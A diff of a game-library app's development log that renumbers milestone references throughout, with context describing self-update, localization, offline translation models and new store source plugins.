   `https://github.com`/`https://*.githubusercontent.com` (release asset downloads redirect
   through the latter), since the default CSP only allowed `ipc:`/`http://ipc.localhost`.
-- **No release workflow existed at all for this repo before now** - Milestone 20's own
+- **No release workflow existed at all for this repo before now** - Milestone 19's own
   write-up had assumed "extend the existing release workflow," which turned out to be wrong
   once actually checked. Wrote `.github/workflows/release.yml` from scratch using Tauri's
   official `tauri-apps/tauri-action` (builds, signs via the two `TAURI_SIGNING_PRIVATE_KEY*`
@@ -2897,13 +2899,13 @@ plugin, not new application logic with an unknown schema change blocking it.
 
 **Version bump, to actually enable testing the update path - user asked for the correct version
 to be evaluated, not just a placeholder bump.** Checked every milestone heading in
-`milestones.md`: Milestones 1-13 are the 1.0.0 baseline; Milestones 17, 18, and 19 have all
+`milestones.md`: Milestones 1-13 are the 1.0.0 baseline; Milestones 16, 17, and 18 have all
 fully closed since, each a real Post-1.0 Roadmap milestone closure the versioning policy ties
 a minor bump to - but the version string had stayed at `1.0.0` the entire time regardless,
 never actually bumped as those closures happened. Milestone 14 doesn't count (explicitly
-never closes, by its own definition); Milestone 20 is still in progress, not closed.
+never closes, by its own definition); Milestone 19 is still in progress, not closed.
 - Correct version: `1.0.0` → `1.3.0` (three missed minor bumps, one per closed Post-1.0
-  milestone) → `1.3.1` (patch, for this session's in-progress Milestone 20 work, per "patch
+  milestone) → `1.3.1` (patch, for this session's in-progress Milestone 19 work, per "patch
   bumps for fixes within a milestone").
 - Bumped `package.json`/`src-tauri/Cargo.toml`/`src-tauri/tauri.conf.json` together to
   `1.3.1`, verified all three match via `grep`. `bun run build`/`cargo check` both clean.
@@ -3022,7 +3024,7 @@ lower version than the target release, to actually test the fix rather than just
 the same old bug. Installed that `1.3.6` build, updated to the published `v1.3.7` release:
 download, install, and relaunch all completed successfully, no `TypeError`. App self-update is
 now fully verified working end to end, not just typechecked/built. Plugin/theme self-update
-(Milestone 20's other half) remains unstarted.
+(Milestone 19's other half) remains unstarted.
 
 **Started plugin/theme self-update with the schema change it's blocked on.** Added two fields
 to both `WasmPluginManifest`/`DataThemeManifest` (`plugin_installer.rs`): `source_url` (the
@@ -3180,7 +3182,7 @@ inlined directly, since that component doesn't share `App.vue`'s local helper sc
   itself accurately instead of the now-stale "baseline for now, proper wiring is later" framing.
 - `bun run build` (typecheck + build) and `cargo check` both clean.
 
-**Milestone 20 fully closed.** App self-update is verified working end to end (a real published
+**Milestone 19 fully closed.** App self-update is verified working end to end (a real published
 release, a real GUI test, a real bug found and fixed along the way). Plugin/theme self-update
 is fully built and wired into four check moments - the schema change, the check command, the
 apply path, and the UI are all in place and pass their own tests - but unlike the app half,
@@ -3236,7 +3238,7 @@ app restart. Fixed by adding the same `loadRegistry()` call to the existing `ope
 (idempotent re-fetch, safe to call again).
 
 Fixing that surfaced a second, smaller issue: the same watcher's `appUpdate.checkForUpdate()`/
-`pluginUpdates.checkAll()` calls (the "third" of Milestone 20's three canonical trigger
+`pluginUpdates.checkAll()` calls (the "third" of Milestone 19's three canonical trigger
 moments) turned out to be genuinely redundant, not just the registry list. `AddPlugin.vue`
 only ever opens from inside `PluginSettings.vue`, and that component's own `onMounted` already
 re-checks updates every time Settings is (re)entered - opening the nested modal can't happen
@@ -3264,7 +3266,7 @@ shape as `App.vue`'s/`PluginSettings.vue`'s own copies) to `AddPlugin.vue`, call
 focus, Settings-view mount, and this modal's own open - not duplicative, since each fires at a
 genuinely distinct point in the session. `bun run build` clean.
 
-## Milestone 21 — Internationalization & Offline Translation (scoped, not started)
+## Milestone 20 — Internationalization & Offline Translation (scoped, not started)
 
 Discussion-only session, prompted by the user wanting i18n but explicitly ruling out paid
 third-party translation APIs (cost aside, wanted the feature to stay fully portable/offline).
@@ -3317,7 +3319,7 @@ kind, a model-download manager, a native llama.cpp integration, plus the separat
 work) better suited to its own dedicated implementation pass.
 
 **Follow-up session: UI i18n implemented (translation-model half still not started).** User
-chose to start Milestone 21 with the smaller, self-contained half - vue-i18n for UI strings -
+chose to start Milestone 20 with the smaller, self-contained half - vue-i18n for UI strings -
 and to fully convert every component in one pass rather than a partial slice, closing that
 checklist item outright. Went through `EnterPlanMode` first since the scope (touch nearly every
 `.vue` file) and one open architecture question (how the eventual translation feature should be
@@ -3410,7 +3412,7 @@ before treating them as final, particularly for longer sentences (`codeWarning`,
 both the initial 9-locale add and the follow-up type-cast cleanup.
 
 **Much later: resumed the translation half, redid the research spike, and switched candidate
-engine.** Picked back up where Milestone 21 left off - the local-LLM translation feature, still
+engine.** Picked back up where Milestone 20 left off - the local-LLM translation feature, still
 unstarted. First step per its own scoping was the research spike: confirm a Rust llama.cpp
 binding actually works on the Windows target before committing to it.
 
@@ -3439,14 +3441,14 @@ real repo), `cargo add mistralrs` (resolved to v0.8.1, default features - no `cu
 the whole point of a research spike is not skipping this step just because the first candidate
 looked reasonable on paper.
 
-Updated Milestone 21's scoping to reflect the outcome: the planned `translation` module's engine
+Updated Milestone 20's scoping to reflect the outcome: the planned `translation` module's engine
 switches from llama.cpp to `mistralrs`; the research-spike checklist item is now closed (marked
 done, but redone against the actual engine that'll be used, not the one originally guessed at).
 The `translation` module itself, the model picker/download-on-first-use Settings UI, and actual
 integration work all remain unstarted - this pass was scoping/de-risking only, same "research
 spike first" discipline the milestone was already scoped to require.
 
-**Immediate follow-up: user said "start now" - built the actual feature, Milestone 21 fully
+**Immediate follow-up: user said "start now" - built the actual feature, Milestone 20 fully
 closed.** Before writing any code, researched real GGUF artifacts rather than inventing plausible
 ones: fetched `mradermacher`'s (a well-established community GGUF quantizer) `translategemma-4b/
 12b/27b-it-GGUF` Hugging Face repos directly and recorded real Q4_K_M file sizes (2.6GB/7.4GB/
@@ -3519,7 +3521,7 @@ pass (a small Node script, not hand-editing 10 files) and re-verified for exact 
 session.
 
 `cargo check` (real `src-tauri` crate, not just the scratch spike) and `bun run build` both
-clean. Milestone 21 is now fully closed - both UI localization and offline translation done.
+clean. Milestone 20 is now fully closed - both UI localization and offline translation done.
 Deliberately deferred, per the plan: persisting a translated description back to the DB,
 translating other fields (release date, tags), canceling an in-progress download, and any model
 beyond the 3 TranslateGemma tiers. Manual, real end-to-end verification (an actual download, an
@@ -3774,7 +3776,7 @@ prior tier swap.
 
 **Follow-up, same session: added Remove buttons for the downloaded engine/models, plus a
 code/milestones.md compaction pass.** First compacted `translation.rs`'s doc comments and
-`milestones.md`'s Milestone 21 section - both had accumulated the full multi-round research
+`milestones.md`'s Milestone 20 section - both had accumulated the full multi-round research
 history verbatim (mistralrs pivot, tier swaps, abliterated addition), duplicating what this
 devlog file already records in detail. Trimmed both down to short pointers back to devlog,
 matching `CLAUDE.md`'s own stated split (milestones.md scannable/what's-done, devlog full
@@ -4282,7 +4284,7 @@ regardless, gated by `hasValidTranslatedTitle`) but worth cleaning up for the sa
 
 `cargo fmt && cargo check` and `bun run build` both clean.
 
-## Milestone 21 — Internationalization & Offline Translation — post-close addition
+## Milestone 20 — Internationalization & Offline Translation — post-close addition
 
 **Added `gemma4-e2b-abliterated` as a 5th tier.** User asked for an uncensored Gemma 4 variant
 alongside the existing `qwen3-4b-abliterated` one, for the same reason - translating an existing
@@ -4303,7 +4305,7 @@ asked directly. Answer: this app's plugin architecture (source/theme/metadata/co
 WASM-sandboxed model (wasmtime, no subprocess spawn, no arbitrary binary download) - translation
 needs raw process spawn (`llama-server.exe`), app-data filesystem writes, and a long-lived
 background task with idle-timeout logic, none of which fits a WASM guest sandbox. It also
-doesn't map onto any of the 4 existing plugin kinds. This was already the original Milestone 21
+doesn't map onto any of the 4 existing plugin kinds. This was already the original Milestone 20
 design decision (host-native module chosen specifically because a heavy inference-adjacent
 feature doesn't fit the sandbox model) - reaffirmed here, not revisited, since nothing changed
 that would make third-party-swappable translation implementations a real need.
@@ -4432,17 +4434,17 @@ instead of just `margin-bottom`, and switched the container from `align-items: c
 `baseline` lines up the real text baselines instead, which is what "align the title with the
 button's text" actually means here. `bun run build` clean.
 
-**Follow-up: updated README.md and the docs site for the now-fully-closed Milestone 21.** Both
+**Follow-up: updated README.md and the docs site for the now-fully-closed Milestone 20.** Both
 had gone stale across this whole translation-feature session - README's Status section still
-said "10-language localization (Milestone 21, UI strings only so far)" and separately listed
-"an offline LLM-based translation feature for game descriptions (Milestone 21's remaining half)"
+said "10-language localization (Milestone 20, UI strings only so far)" and separately listed
+"an offline LLM-based translation feature for game descriptions (Milestone 20's remaining half)"
 under Open work, and the docs site (`docs/guide/`) had zero mentions of translation anywhere,
 despite the feature now being fully built (engine download, 4 model tiers, per-field translate/
 show/revoke, persisted per-game state).
 
 README: added a dedicated "Offline translation" bullet to the Features list (on-device, no
 external service, model tiers including the uncensored one, per-field independence, persistence/
-invalidation rules) and folded Milestone 21 into the Status paragraph's "done" list instead of
+invalidation rules) and folded Milestone 20 into the Status paragraph's "done" list instead of
 its own "open work" callout, removing the now-stale "UI strings only so far"/"remaining half"
 qualifiers entirely.
 
@@ -4571,7 +4573,7 @@ instead:
 
 `cargo check` and `bun run build` both clean after all three fixes.
 
-## Milestone 22 — Plugin-Developer Documentation Site
+## Milestone 21 — Plugin-Developer Documentation Site
 
 User wants real documentation (wiki-style), and was asked which audience first - plugin
 developers or end users. Recommended developer docs: the WASM plugin system (Component Model,
@@ -4666,7 +4668,7 @@ the literally-requested `v4` first (`upload-pages-artifact` was still on `v3`;`d
 already `v4`), then bumped both to `v5` on a follow-up request once the `v5` availability was
 flagged.
 
-**Then continued to the last open Milestone 22 item**: end-user docs, under a new `docs/guide/`
+**Then continued to the last open Milestone 21 item**: end-user docs, under a new `docs/guide/`
 section (separate VitePress sidebar/nav entry, "User Guide", alongside "Plugin Docs" - the
 landing page's hero actions now link to both). Four pages, each grounded in the actual current
 app behavior rather than generic filler:
@@ -4722,9 +4724,9 @@ same shared `.shimmer` class as the cover skeleton above, not a new animation. A
 re-triggers `useImageBrightness` and thus `textPending` the same way initial navigation does -
 no separate handling needed for that path. `bun run build` clean.
 
-## Milestone 23 — Docs Site Internationalization (scoped, not started)
+## Milestone 22 — Docs Site Internationalization (scoped, not started)
 
-User asked whether the docs site (Milestone 22) could get i18n like the app's own UI (Milestone
+User asked whether the docs site (Milestone 21) could get i18n like the app's own UI (Milestone
 21's 10 languages). Checked feasibility directly against this project's actual pinned VitePress
 version (`docs/package.json` → `1.6.4`) rather than assuming from general VitePress knowledge -
 1.6.4 does support i18n natively, via a `locales` key in `.vitepress/config.ts` plus per-locale
@@ -4749,7 +4751,7 @@ followed for every other milestone.
 
 **Immediate follow-up, same session: while docs-site i18n stays scoped/unstarted, translated
 the top-level README instead.** User asked to i18n the README specifically, distinct from the
-Milestone 23 docs-site scope above - a single file, not 12 pages, so no milestone entry needed
+Milestone 22 docs-site scope above - a single file, not 12 pages, so no milestone entry needed
 for this one; just done directly. Added `README.<locale>.md` for all 9 non-English UI locales
 (`ko`/`ja`/`zh-Hans`/`es`/`fr`/`de`/`pt-BR`/`ru`/`it`), each a full translation of every
 section (Features through the new Third-Party Notices), machine-translated - same disclosed
@@ -4892,7 +4894,7 @@ geographic access restriction" reads very differently out of context than every 
 plugin's "fetches from a documented API," even though the actual use case (a user's own library
 app showing metadata for games they already access) isn't remotely piracy-adjacent - better to
 keep that reasoning available but not sitting bare in a public repo. Added a deliberately
-high-level Milestone 24 entry to the tracked `milestones.md` (no ToS/proxy/region detail, just
+high-level Milestone 23 entry to the tracked `milestones.md` (no ToS/proxy/region detail, just
 "no official API, see private notes") and moved the full research - the robots.txt/ToS findings,
 the region-restriction/proxy angle and why it's sensitive, and the real open questions before
 this could ever start - into a new `.claude/dlsite-plugin-notes.md`, added to `.gitignore`
@@ -4956,7 +4958,7 @@ Each step was verified with `bun run build` (typecheck + production build) befor
 no GUI/hardware testing possible in this environment, so the user validated steps 1-4 with
 their own real controllers between requests.
 
-## Milestone 25 — Detachable Controller Mapping Plugins (scoped, not started)
+## Milestone 24 — Detachable Controller Mapping Plugins (scoped, not started)
 
 User asked, after the above work, whether `standard-gamepad`/`8bitdo-micro` - still build-time-
 bundled TS plugins - could be "detached" the way source/metadata/wrapper plugins already are
@@ -4967,23 +4969,23 @@ neither currently covers the `controller` kind.
 - **WASM runtime** (`source`/`wrapper`/`metadata`) - built for plugins with real behavior
   (`scan()`/`launch()`/`fetchMetadataById()` etc.) needing a sandboxed execution environment.
   Overkill for a controller mapping, which is pure data.
-- **Data-only runtime** (`theme` only, Milestone 17) - `plugin_installer.rs`'s
+- **Data-only runtime** (`theme` only, Milestone 16) - `plugin_installer.rs`'s
   `DataThemeManifest` struct and `list_data_themes`/`install_data_theme`/`uninstall_data_theme`
   commands, install-by-URL, zero code execution. A controllers's `GamepadMapping` is exactly
   this shape (data, no behavior) - the natural fit - but the existing structs/commands are
   theme-shaped specifically (`cssVariables`/`cardVisual`/`fontFaces` fields), not generic, so
   reusing this tier for `kind: "controller"` is real new backend + frontend work, not a flag.
 
-Scoped as Milestone 25 in `milestones.md` rather than started immediately - genuine new surface
+Scoped as Milestone 24 in `milestones.md` rather than started immediately - genuine new surface
 area (new Rust struct/commands, `loader.ts` wiring, `PluginSettings.vue`/`AddPlugin.vue` install-
 flow support for the Controller tab, eventually a new `data-controller-plugins` repo mirroring
 `data-theme-plugins`, and a `concourse-plugin-registry` `kind: "controller"` extension - same
-precedent Milestone 17 set for `kind: "theme"`). Left unstarted pending the user's go-ahead.
+precedent Milestone 16 set for `kind: "theme"`). Left unstarted pending the user's go-ahead.
 
-## Milestone 16 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch) — research
+## Milestone 15 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch) — research
 
-Ranged over several requests: brainstormed what else could go into `milestones.md` (M26-38
-recorded separately), which touched on M16's still-unstarted Xbox/EA/Ubisoft plugins - user
+Ranged over several requests: brainstormed what else could go into `milestones.md` (M25-37
+recorded separately), which touched on M15's still-unstarted Xbox/EA/Ubisoft plugins - user
 doesn't use any of the three, asked what to download free for an end-to-end test, then asked to
 actually research each platform's real install-detection/launch format before writing any code
 (same discipline `steam.rs`/`epic.rs`/`gog.rs` were built against - verified real manifests, not
@@ -5026,7 +5028,7 @@ the Steam/Epic/GOG parsers which were built and tested against real manifests):*
   Launch via `uplay://launch/<gameID>/0` (`0`/`1` selecting single-/multiplayer mode where a game
   has both) - also a real `://` URI, same `openUrl()` pattern.
 
-Recorded directly in `milestones.md`'s M16 checklist (marked the three research items `[x]`,
+Recorded directly in `milestones.md`'s M15 checklist (marked the three research items `[x]`,
 each carrying the "community-sourced, not yet verified" caveat inline) rather than only here,
 since the short-form finding is scannable enough to belong in the tracked checklist itself, not
 just prose in this file - added a new unchecked verification item ("verify all three findings
@@ -5034,7 +5036,7 @@ against real installed games") so the checklist honestly reflects that this is r
 confirmed fact, until the user actually installs the three recommended test games and checks
 these paths/formats against reality.
 
-## Milestone 16 — Xbox Source Plugin: Built and Published
+## Milestone 15 — Xbox Source Plugin: Built and Published
 
 User already had both the Xbox app (`Microsoft.GamingApp`) and Minecraft (`MinecraftUWP`/
 `MinecraftJavaEdition`) installed - checked via `Get-AppxPackage` directly rather than assuming
@@ -5138,7 +5140,7 @@ Windows detected, launched successfully through the real running app - not just 
 time, actually GUI-tested. EA app and Ubisoft Connect plugins remain unstarted, now in the same
 "research done, nothing built" position Xbox was in before this pass.
 
-## Milestone 16 — EA Source Plugin: Built and Published
+## Milestone 15 — EA Source Plugin: Built and Published
 
 User bought Unravel ($5) via the EA app specifically to have a real title to verify against -
 same discipline as Xbox/Minecraft. Findings ended up meaningfully different from, and simpler
@@ -5208,7 +5210,7 @@ real `v0.1.0` asset, computed its real SHA256
 launches through the running app) - same as Xbox's position before its own GUI test. Ubisoft
 Connect remains completely unstarted.
 
-## Milestone 16 — EA/Xbox: Two Real Bugs Caught by In-App Verification
+## Milestone 15 — EA/Xbox: Two Real Bugs Caught by In-App Verification
 
 Real in-app testing of the EA plugin surfaced two genuine bugs - one host-config gap, one
 cross-plugin logic bug affecting Xbox too.
@@ -5272,7 +5274,7 @@ the corrected 0.1.1 data. A version bump alone never retroactively touches rows 
 an older plugin version; only a rescan does. User rescanned, confirmed playtime tracking for
 real afterward.
 
-## Milestone 16 — Ubisoft Connect Source Plugin: Built and Published
+## Milestone 15 — Ubisoft Connect Source Plugin: Built and Published
 
 User installed Ubisoft Connect + Brawlhalla specifically to verify against, same discipline as
 Xbox/EA. This one confirmed the original community-sourced research almost exactly, and turned
@@ -5339,7 +5341,7 @@ build-passing, since this bug only manifests at lazy runtime compile) rather tha
 own `\\` escape resolves to one real backslash, landing on the originally-intended format with
 no extra spaces. Switched all 10 locales to this cleaner fix.
 
-## Milestone 16 — XDefiant Phantom Entry: Registry-Only Detection Can Outlive a Real Install
+## Milestone 15 — XDefiant Phantom Entry: Registry-Only Detection Can Outlive a Real Install
 
 User noticed XDefiant (a Ubisoft live-service game, publicly shut down) still showed up after
 scanning Ubisoft Connect, and didn't think they even had it fully installed. Checked directly
@@ -5388,7 +5390,7 @@ second one (Ubisoft's PR merged to `main` moments before EA's), resolved the sam
 before: merge `main` into the bump branch locally, push, re-validate, merge. Both registry
 entries verified pointing at their real fixed versions afterward.
 
-## Milestone 17 — ARC Raiders Theme + New `--content-background` Hook
+## Milestone 16 — ARC Raiders Theme + New `--content-background` Hook
 
 User asked for a theme "based on ARC Raiders" with 4 diagonal stripes in red/yellow/green/blue
 on the content background. Checked the real game's actual logo before building anything, same
